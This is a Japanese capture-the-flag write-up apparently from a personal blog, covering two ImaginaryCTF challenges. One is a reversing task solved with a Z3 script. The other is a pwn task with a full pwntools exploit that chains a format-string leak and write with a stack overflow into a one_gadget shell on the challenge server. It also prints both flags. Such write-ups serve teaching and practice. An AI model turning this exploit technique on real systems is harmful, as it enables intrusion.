<h2 id="watchdogrev" style="position:relative;"><a href="#watchdogrev" aria-label="watchdogrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>watchdog(Rev)</h2>
<blockquote>
<p>The keepers of the Watchdog vault have forgotten their password. Can you help them retrieve it?</p>
</blockquote>
<p>問題バイナリをデコンパイルしてみると、main 関数では入力文字列の長さが 0x2b であるかを検証した後、evalMultiPoly という関数を通して生成されたベクタテーブルがハードコードされている値と一致するかを検証していることがわかります。</p>
<p>この evalMultiPoly では、入力文字の数だけ evalVectPoly 関数を呼び出し、その結果を戻り値のベクタテーブルに格納しています。</p>
<p>evalVectPoly 関数では、1 回のループごとに <code class="language-text">result = pow(n+2,length-1) + pow(n+2,length-2) ... + pow(n+2,0)</code> までを行う関数のようです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token class-name">int64_t</span> <span class="token function">evalVectPoly</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token operator">*</span> copied_input_vector<span class="token punctuation">,</span> <span class="token class-name">int64_t</span> n<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">int64_t</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">vector_size</span><span class="token punctuation">(</span>copied_input_vector<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">int64_t</span> rbx_1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">v_operator</span><span class="token punctuation">(</span>copied_input_vector<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">vector_size</span><span class="token punctuation">(</span>copied_input_vector<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// O(logn)で累乗計算を行う関数</span>
        <span class="token comment">// pow(n+2,lengh)</span>
        result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token function">my_pow</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> rbx_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>あとはこのコードを Python スクリプトに落とし込んで Z3Py を使用することで Flag を取得できます。</p>
<p>シンボリックリンク変数 flag のサイズを 8 バイトにしてしまうとその先の計算結果を評価できなくなってしまうので、シンボリックリンク変数のサイズを 64bit にする必要がある点に注意が必要でした。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">answer <span class="token operator">=</span> <span class="token punctuation">[</span>
	<span class="token number">0x348a627d10659</span><span class="token punctuation">,</span> <span class="token number">0x27485a840365fe61</span><span class="token punctuation">,</span>
	<span class="token number">0x9e735dadf26d31cd</span><span class="token punctuation">,</span> <span class="token number">0x82714bc9f9b579d9</span><span class="token punctuation">,</span>
	<span class="token number">0x3dfb7cc801d16bc9</span><span class="token punctuation">,</span> <span class="token number">0x602a04efe5dad659</span><span class="token punctuation">,</span>
	<span class="token number">0xeb801d915a30d3d</span><span class="token punctuation">,</span> <span class="token number">0x217dbe10edcb20a1</span><span class="token punctuation">,</span>
	<span class="token number">0xadee2637e875ca19</span><span class="token punctuation">,</span> <span class="token number">0xcd44aed238e9871</span><span class="token punctuation">,</span>
	<span class="token number">0xd3bff76ae6b504d</span><span class="token punctuation">,</span> <span class="token number">0x7181426eff59e789</span><span class="token punctuation">,</span>
	<span class="token number">0x477616cb20c2dac9</span><span class="token punctuation">,</span> <span class="token number">0xce1206e1e46ce4a9</span><span class="token punctuation">,</span>
	<span class="token number">0x946e7cb964a3f87d</span><span class="token punctuation">,</span> <span class="token number">0x0499607cbf0c3291</span><span class="token punctuation">,</span>
	<span class="token number">0x6871d4372347c759</span><span class="token punctuation">,</span> <span class="token number">0x075412f56b7d8b01</span><span class="token punctuation">,</span>
	<span class="token number">0xf8e57c264786e34d</span><span class="token punctuation">,</span> <span class="token number">0x194ca6020ec505b9</span><span class="token punctuation">,</span>
	<span class="token number">0x3e1a22e34fe84949</span><span class="token punctuation">,</span> <span class="token number">0xa46de25172742b79</span><span class="token punctuation">,</span>
	<span class="token number">0xcd0e971bcbfe6e3d</span><span class="token punctuation">,</span> <span class="token number">0x56561961138a2501</span><span class="token punctuation">,</span>
	<span class="token number">0x78d2b538ab53ca19</span><span class="token punctuation">,</span> <span class="token number">0xa9980ca75ab6d611</span><span class="token punctuation">,</span>
	<span class="token number">0x5f81576b5d4716cd</span><span class="token punctuation">,</span> <span class="token number">0x17b9860825b93469</span><span class="token punctuation">,</span>
	<span class="token number">0xc012f75269298349</span><span class="token punctuation">,</span> <span class="token number">0x17373ee9c7a3aac9</span><span class="token punctuation">,</span>
	<span class="token number">0xb2e50798b11e1a7d</span><span class="token punctuation">,</span> <span class="token number">0xada5a6562e0fd7f1</span><span class="token punctuation">,</span>
	<span class="token number">0xec3d9a68f1c99e59</span><span class="token punctuation">,</span> <span class="token number">0x3d828b35505d79a1</span><span class="token punctuation">,</span>
	<span class="token number">0xf76e5264f7bd16cd</span><span class="token punctuation">,</span> <span class="token number">0xdd230b3ec48ed399</span><span class="token punctuation">,</span>
	<span class="token number">0x80d93363dcd354c9</span><span class="token punctuation">,</span> <span class="token number">0x7031567681e76299</span><span class="token punctuation">,</span>
	<span class="token number">0x8977338cd4e2a93d</span><span class="token punctuation">,</span> <span class="token number">0x8a5708a1d4c02b61</span><span class="token punctuation">,</span>
	<span class="token number">0x2066296a21501019</span><span class="token punctuation">,</span> <span class="token number">0x9e260d94a4d775b1</span><span class="token punctuation">,</span>
	<span class="token number">0xe7667bbd72280f4d</span><span class="token punctuation">,</span> <span class="token number">0x12df4035e1684349</span>
<span class="token punctuation">]</span>

<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">evalVectPoly</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>words<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token number">0</span>
    l <span class="token operator">=</span> <span class="token number">0x2b</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>l<span class="token operator">-</span>i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">*</span> words<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span>


<span class="token comment"># flag のベクタサイズを 64bit にする</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">]"</span></span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span>
        <span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"t"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

n <span class="token operator">=</span> <span class="token number">2</span>
<span class="token keyword">for</span> a <span class="token keyword">in</span> answer<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a <span class="token operator">==</span> evalVectPoly<span class="token punctuation">(</span>n<span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">while</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>
    m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre></div>
<p>この Solver を実行すると <code class="language-text">ictf{i_l0ve_interp0lati0n_2ca38d6ef0a709e0}</code> が正しい Flag であることを特定できます。</p>
<h2 id="imgstorepwn" style="position:relative;"><a href="#imgstorepwn" aria-label="imgstorepwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>imgstore(Pwn)</h2>
<blockquote>
<p>Back to the old school.</p>
</blockquote>
<p>問題バイナリをデコンパイルしてみると、List、Buy、Sell の 3 つの関数を選択して実行できるアプリケーションであることがわかります。</p>
<p>この時、<code class="language-text">sell_book</code> 関数には FSB の脆弱性があることがわかります。</p>
<p>また、関数の実行時にランダムに生成される 4 バイトの値に 0x13f5c223 をかけた値がハードコードされている特定の値と一致した場合にのみ、BoF の脆弱性を持つ vuln 関数を呼び出すことができます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token class-name">int64_t</span> <span class="token function">sell_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span><span class="token operator">*</span> fsbase
    <span class="token class-name">int64_t</span> rax <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>fsbase <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span>
    <span class="token class-name">int32_t</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>file<span class="token operator">:</span> <span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> oflag<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token class-name">uint32_t</span> buf
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> nbytes<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span>
    buf <span class="token operator">=</span> zx<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span>w<span class="token punctuation">)</span>
    <span class="token keyword">char</span> i
    
    <span class="token keyword">do</span>
        <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">"Enter book title: "</span><span class="token punctuation">)</span>
        <span class="token keyword">void</span> input
        <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token operator">:</span> <span class="token operator">&amp;</span>input<span class="token punctuation">,</span> n<span class="token operator">:</span> <span class="token number">0x32</span><span class="token punctuation">,</span> fp<span class="token operator">:</span> <span class="token constant">stdin</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">"Book title --> "</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token operator">&amp;</span>input<span class="token punctuation">)</span>
        <span class="token function">puts</span><span class="token punctuation">(</span>str<span class="token operator">:</span> <span class="token operator">&amp;</span>unk1<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">*</span> <span class="token number">0x13f5c223</span> <span class="token operator">==</span> data_6050<span class="token punctuation">)</span>
            data_608c <span class="token operator">=</span> <span class="token number">2</span>
            <span class="token function">vuln</span><span class="token punctuation">(</span>data_608c<span class="token punctuation">)</span>
        
        <span class="token function">puts</span><span class="token punctuation">(</span>str<span class="token operator">:</span> <span class="token string">"Sorry, we already have the same …"</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">"Still interested in selling your…"</span><span class="token punctuation">)</span>
        <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token operator">&amp;</span>data_38a7<span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span>
        <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0x79</span><span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>str<span class="token operator">:</span> <span class="token operator">&amp;</span>unk1<span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">"%s[-] Exiting program..%s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1b[31m"</span><span class="token punctuation">,</span> <span class="token string">"\x1b[0m"</span><span class="token punctuation">)</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token class-name">int64_t</span> result <span class="token operator">=</span> rax <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>fsbase <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    
    <span class="token function">__stack_chk_fail</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    noreturn
<span class="token punctuation">}</span></code></pre></div>
<p>エクスプロイトのため、以下のステップでペイロードを送り込みました。</p>
<ol>
<li>FSB を悪用して、ランダム生成された  4 バイトの値と、<code class="language-text">data_6050</code> のアドレス、Canary、libc のベースアドレスを抜き出す</li>
<li>FSB を使用して <code class="language-text">data_6050</code> のアドレスにランダムに生成される 4 バイトの値に 0x13f5c223 をかけた値を埋め込む</li>
<li>Vuln 関数を実行して One Gadget を発行する</li>
</ol>
<p>この問題を解くために以下の Solver を作成しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># Set context</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>word_size <span class="token operator">=</span> <span class="token number">64</span>

<span class="token comment"># Set target</span>
TARGET_PATH <span class="token operator">=</span> <span class="token string">"./imgstore_patched"</span>
exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>TARGET_PATH<span class="token punctuation">)</span>

target <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"imgstore.chal.imaginaryctf.org"</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># Exploit</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b">> "</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b"3"</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># First chance</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter book title: "</span><span class="token punctuation">)</span>
<span class="token comment"># 0x8c87dec5</span>
<span class="token comment"># payload = b"%100c%8$n"</span>
payload <span class="token operator">=</span> <span class="token string">b"%6$p %7$p %17$p %25$p"</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># "Book title --> $HEX\n"</span>
r <span class="token operator">=</span> target<span class="token punctuation">.</span>recvline_startswith<span class="token punctuation">(</span><span class="token string">b"Book title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
hex_value <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"(0x[0-9a-fA-F]{1,16})"</span><span class="token punctuation">)</span>
feedbeef_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>hex_value<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x10</span>
rand_val <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>hex_value<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span>
leaked_canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>hex_value<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
leaked_libc_start_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>hex_value<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> leaked_libc_start_main <span class="token operator">-</span> <span class="token number">0x24083</span>
val <span class="token operator">=</span> <span class="token punctuation">(</span>rand_val<span class="token operator">*</span><span class="token number">0x13f5c223</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>feedbeef_addr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rand_val<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leaked_canary<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base    <span class="token punctuation">)</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"y"</span><span class="token punctuation">)</span>

<span class="token comment"># Second chance</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter book title: "</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>feedbeef_addr<span class="token punctuation">:</span>val<span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

pop_r12_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x199212</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xe3afe</span>

<span class="token comment"># Vuln func</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">,</span>
    leaked_canary<span class="token punctuation">,</span>
    <span class="token string">b"B"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">,</span>
    pop_r12_ret<span class="token punctuation">,</span>
    <span class="token string">b"\x00"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span>
    one_gadget
<span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># Finish exploit</span>
target<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<p>これを実行すると正しい Flag を特定できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 350px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9eb7b8e71fc6a416fb9cea14a09c4682/13ae7/image-20240720173827955.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 108.74999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAAsTAAALEwEAmpwYAAADCUlEQVQ4y5VUXW8cNRT12GOPxzM7u5tlM7Nfs1/JfqWbbdKUJESogickJESlIsQjL0hVhVShqn3lF/BWqoL4rYczBqlJ0W6Wh6trezzH555zbSGEwO0IggBByCyZpYBUAUTAHCjE2iF2EbQN/PeP//03PkxkIGG0QZRK2DREXOc8Vgi1QqQj2ChCYmpckwijPQB1aGC1RWwcTCpgm1zTFbMEkVP+EO0EEpsglOF+gI2keVcCIdFoptA8wNgQqa57UBWJ+wGVEailKUHulpPkAlGkEceW2cBFZBiqPQCtQNxQkLcEr8yoZTFliD2Q1iGcddDK7GEK3bU1haSuveg2pX6pQWzJLLQwYeQl8KZoeT9gJbSJyKBO8SOakNHtmOBGenYuiTjmQe6ftZ2ASio4k0Bp4UErBp6J1NAmROLovOHYKr+3YroT0JqIpbFt6GTWF0g7As3cImuwjWL2piMzq9kyDire6jAvAZu5ipAtk9oGXIMN3OLPLC+LD2hGDY20RSMyCClpRkSm7EG5BfDRty/x5Pmf+PzH3/D96/d49uoPfPnTW3z98zs8/eUdvnrxFt+8/B0/vHmP717/hbNnv0Iou53hxek1ThY32HzxFOP1DTqzC+SzS/QWVxgsrzFYXaM7r8ZX6K8+Q2OwYVlqO+Ck00aPfVYULaSOGm53b7/olyXOP73A5uEGi+UC88WcHz6++MGHCILdgNPpBJeXj7E+XWO5WmAw6PM20M00oasWju0iaUYVxpj7GQ5HQ4zGVYywJMPJdIzp0QTnj858ns2OMeKeat/hYdu/l7sBhyUerE9wmB+iYluWA7Rarf88urfzzijJaD6fEfQBik7hgVerJZTabc5t8DsHnfC56lO3qsTmQZMlT/DwbIN2u42joymB1f9zeczyKn1ON2s6PPNg1bgoCjym+5Wu48kI9XrGfSW63Q5yVnF8fIQBdR+6GE9urjHl3AO2WWZR5GT0CcrhAGNumkzGyLIM3V7Xg1QyHJB9nud+T6/f8+y7ZR89dsLVxbknVQH+DSE+96rOy6w7AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9eb7b8e71fc6a416fb9cea14a09c4682/8ac56/image-20240720173827955.webp 240w,
/static/9eb7b8e71fc6a416fb9cea14a09c4682/a3432/image-20240720173827955.webp 350w"
              sizes="(max-width: 350px) 100vw, 350px"
              type="image/webp"
            />
          <source
            srcset="/static/9eb7b8e71fc6a416fb9cea14a09c4682/8ff5a/image-20240720173827955.png 240w,
/static/9eb7b8e71fc6a416fb9cea14a09c4682/13ae7/image-20240720173827955.png 350w"
            sizes="(max-width: 350px) 100vw, 350px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9eb7b8e71fc6a416fb9cea14a09c4682/13ae7/image-20240720173827955.png"
            alt="image-20240720173827955"
            title="image-20240720173827955"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
